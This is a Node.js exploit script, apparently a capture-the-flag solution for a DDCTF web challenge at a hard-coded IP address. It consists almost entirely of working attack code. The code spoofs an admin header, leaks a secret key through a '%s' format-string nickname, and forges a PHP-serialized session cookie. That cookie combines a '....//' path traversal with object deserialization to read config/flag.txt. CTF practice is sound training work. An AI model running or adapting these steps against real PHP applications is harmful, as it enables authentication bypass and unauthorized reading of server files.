const got = require('got')
const { CookieJar } = require('tough-cookie')
const FormData = require('form-data')

const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'

function serialize (body) {
  return body.replace(/}{/g, '}\n{').split('\n').map((str) => JSON.parse(str))
}

const gotty = got.extend({
  headers: {
    'user-agent': UA,
  },
  retry: 5,
})

async function step1 () {
  const response = await gotty.post('http://117.51.158.44/./././app/Auth.php', {
    headers: {
      didictf_username: 'admin',
    },
  })
  const data = serialize(response.body)[0]
  // console.log(data)
  // message: 您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php
  return data
}

async function step2 () {
  const url = 'http://117.51.158.44/app/Session.php'

  async function createCookieJar () {
    const jar = new CookieJar()
    const response = await gotty.post(url, {
      headers: {
        didictf_username: 'admin',
      },
      cookieJar: jar,
    })
    console.log('Response via creating jar\n', serialize(response.body))
    return jar
  }

  async function fetchKey (jar) {
    const form = new FormData()
    form.append('nickname', '%s')
  
    const response = await gotty.post(url, {
      headers: {
        didictf_username: 'admin',
      },
      cookieJar: jar,
      body: form,
    })
  
    let data = serialize(response.body)
    console.log('Response via re-fetch\n', data)
    let message = data[1].data
    // message: Welcome my friend EzblrbNS
    return message
  }

  function parseJarData (jar) {
    const payload = decodeURIComponent(jar.toJSON().cookies.find(({ key }) => key === 'ddctf_id').value)
    const array = payload.replace(/^.*{/, '').replace(/;}.*$/, '').split(';').map((str) => JSON.parse(str.replace(/^s:\d+:/, '')))
    let data = {}
    for (let i = 0; i < array.length / 2; i++) {
      data[array[i * 2]] = array[i * 2 + 1]
    }
    return data
  }

  const jar = await createCookieJar()
  const message = await(fetchKey(jar))
  return message
}

/**
 * https://ctf-wiki.github.io/ctf-wiki/web/php/php/#_14
 */
async function step4 () {
  const session = 'O:11:"Application":1:{s:4:"path";s:21:"....//config/flag.txt";}77cd55a8d29df4f005f85e536d876525'
  const response = await gotty.post('http://117.51.158.44/app/Session.php?', {
    headers: {
      didictf_username: 'admin',
      cookie: `ddctf_id=${encodeURIComponent(session)};`,
    },
  })
  // console.log(response)
  // console.log(serialize(response.body))
  return serialize(response.body)[1].data
}

async function main () {
  console.log('Step1: ---')
  console.log(await step1())
  console.log('Step2: ---')
  console.log(await step2())
  console.log('Step3: ---')
  console.log('use serialize.php to do step3')
  console.log('Step4: ---')
  console.log(await step4())
}

main()
